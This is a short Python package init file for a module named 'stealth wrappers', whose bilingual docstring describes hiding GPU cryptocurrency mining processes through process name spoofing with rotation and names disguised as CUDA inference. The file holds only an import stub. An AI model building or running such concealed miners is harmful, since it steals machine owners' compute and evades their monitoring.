"""mining_environment.stealth.wrappers

🎮 **[GPU-Only Stealth Process Wrappers]** (Bộ bọc tiến trình ẩn danh GPU)

Wrapper scripts cho **[GPU Mining Processes]** (tiến trình khai thác GPU)
với **[Self-Stealth Capabilities]** (khả năng tự ẩn danh).

⚠️ COMPONENTS:
- **stealth_inference_cuda.py**: GPU mining stealth wrapper (CPU wrapper removed)

✅ FEATURES:
- GPU process protection
- Process name spoofing với rotation
- Signal handling & graceful cleanup
- Exec và subprocess fallback modes
- GPU-optimized stealth names
"""

# GPU-only wrapper main function (CPU wrapper removed)
try:
    from .stealth_inference_cuda import main as gpu_stealth_main  
except ImportError:
    gpu_stealth_main = None

__all__ = ['gpu_stealth_main']